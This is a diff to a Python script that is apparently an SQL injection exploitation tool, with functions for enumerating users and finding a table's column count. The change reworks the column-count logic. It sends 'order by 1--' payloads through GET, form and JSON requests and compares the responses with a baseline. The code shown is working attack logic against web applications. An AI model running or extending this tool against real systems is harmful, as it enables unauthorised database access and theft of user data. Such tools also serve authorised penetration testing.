@@ -385,7 +385,7 @@ def enum_users(method,url,content_type,body,domain,column_number,column_type,dat
 #Logic to determine the number of columns and the type of data that can be used.
 def determine_columns(method,url,content_type,body,data,parameter,encoding,proxies,cookies):
     print("[+] Determining the number of columns in the table...")
-    payload = data + f" order by 1--"
+    payload = data
 
     headers = {'Content-Type': content_type}
 
@@ -401,6 +401,30 @@ def determine_columns(method,url,content_type,body,data,parameter,encoding,proxi
 
     
     baseline_response = response.text
+
+
+    payload = data + "order by 1--"
+
+    headers = {'Content-Type': content_type}
+
+    if method == "POST":
+        if "json" in content_type:
+            response = post_request_json(url,body,headers,payload,encoding,proxies,cookies)
+
+        else:
+            response = post_request_form(url,body,headers,payload,encoding,proxies,cookies)
+        
+    else:
+        response = get_request(url,payload,headers,encoding,proxies,cookies)
+
+    
+    second_response = response.text
+    
+    
+    if baseline_response == second_response:
+        print("[-] Cannot determine the number of columns. Check payload or encoding method.")
+        sys.exit(1)
+    
 
     #Increment order by value to determine number of columns
     i = 2
@@ -419,9 +443,10 @@ def determine_columns(method,url,content_type,body,data,parameter,encoding,proxi
             response = get_request(url,payload,headers,encoding,proxies,cookies)
     
 
-        if str(response.text) != str(baseline_response):
+        if str(response.text) != str(second_response):
             valid = False
             break
+        
         else:
             i += 1
             continue
